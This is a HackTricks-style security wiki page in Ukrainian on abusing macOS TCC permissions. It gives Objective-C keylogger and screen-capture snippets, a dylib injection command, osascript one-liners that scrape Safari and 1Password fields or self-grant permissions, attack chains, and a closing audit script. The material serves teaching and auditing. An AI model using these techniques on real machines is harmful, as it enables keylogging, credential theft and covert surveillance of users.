# Зловживання Input Monitoring, Screen Capture та Accessibility в macOS

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Три пов'язані служби TCC контролюють, як додатки можуть спостерігати та взаємодіяти з робочою сесією користувача:

| Служба TCC | Дозвіл | Можливості |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Читати всі події клавіатури та миші по всій системі (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Впроваджувати синтетичні події клавіатури та миші |
| `kTCCServiceScreenCapture` | **Screen Capture** | Читати буфер дисплея, робити скриншоти, записувати екран |
| `kTCCServiceAccessibility` | **Accessibility** | Керувати іншими додатками через AXUIElement API, читати елементи UI |

Ці дозволи є **найнебезпечнішою комбінацією** в macOS — разом вони дають:
- Повний keylogging кожного натискання клавіші (паролі, повідомлення, дані кредитних карт)
- Запис екрану всього видимого контенту
- Синтетична ін'єкція вводу (натискати кнопки, підтверджувати діалоги)
- Повний контроль GUI, еквівалентний фізичному доступу

---

## Input Monitoring (kTCCServiceListenEvent)

### Як це працює

macOS використовує **`CGEventTap` API** для дозволу процесам перехоплювати події вводу з системи подій Quartz. Процес з дозволом ListenEvent може створити event tap, який отримує **усі події клавіатури та миші** до того, як вони потраплять у цільовий додаток або після цього.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Пошук бінарних файлів із entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Атака: Keylogging via Code Injection

Якщо бінарний файл з дозволом ListenEvent також має **disabled library validation** або **allows DYLD environment variables**, зловмисник може впровадити dylib, який реєструє CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Інжектований dylib успадковує ListenEvent TCC grant цілі і перехоплює всі keystrokes.

### Атака: Credential Harvesting

Просунутий keylogger може корелювати keystrokes з активним додатком:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Як це працює

Дозвіл PostEvent дозволяє створювати event tap з **`kCGEventTapOptionDefault`** (can modify/inject events) замість ListenOnly. Це дає змогу:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Attack: Automated TCC Prompt Approval

За допомогою PostEvent зловмисник може **симулювати натискання "Allow"** у діалогах дозволів TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Захоплення екрана (kTCCServiceScreenCapture)

### Як це працює

Дозвіл на захоплення екрана дозволяє читати буфер дисплея за допомогою:
- **`CGWindowListCreateImage`** — захоплювати будь-яке вікно або весь екран
- **`ScreenCaptureKit`** (macOS 12.3+) — сучасний API для потокової передачі вмісту екрана
- **`CGDisplayStream`** — апаратно-прискорене захоплення екрана
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Пошук клієнтів захоплення екрана
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Атака: Credential Capture via OCR

Впроваджений процес screen capture може періодично захоплювати кадри та використовувати OCR для витягнення паролів:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Починаючи з **macOS Sonoma**, screen capture показує **постійний індикатор** у рядку меню. У старіших версіях screen recording міг бути повністю беззвучним. Однак короткий single-frame capture все ще може залишитися непоміченим для користувачів.
  
### Атака: Session Recording

Безперервне screen recording забезпечує повне відтворення сесії користувача:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Доступність (kTCCServiceAccessibility)

### Як це працює

Доступ до Accessibility надає контроль над іншими додатками через **AXUIElement API**. Процес із доступом до Accessibility може:

1. **Читати** будь-який елемент UI у будь-якому додатку (текстові поля, мітки, кнопки, меню)
2. **Натискати** кнопки та взаємодіяти з елементами керування
3. **Вводити** текст у будь-яке текстове поле
4. **Переміщатися** по меню та діалогах
5. **Збирати** відображені дані з будь-якого запущеного додатку
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

Найнебезпечнішим зловживанням Accessibility є **перехід у System Settings, щоб надати власному шкідливому ПЗ додаткові дозволи**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attack: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Атака: автоматизовані дії користувача
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Ланцюги атак

### Ланцюг: Input Monitoring + Screen Capture = Повне спостереження
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Ланцюг: Accessibility + PostEvent = Повний віддалений контроль
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Ланцюг: Доступність → Самонадання доступу до камери/мікрофона → Спостереження
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Виявлення та збір інформації
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Посилання

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
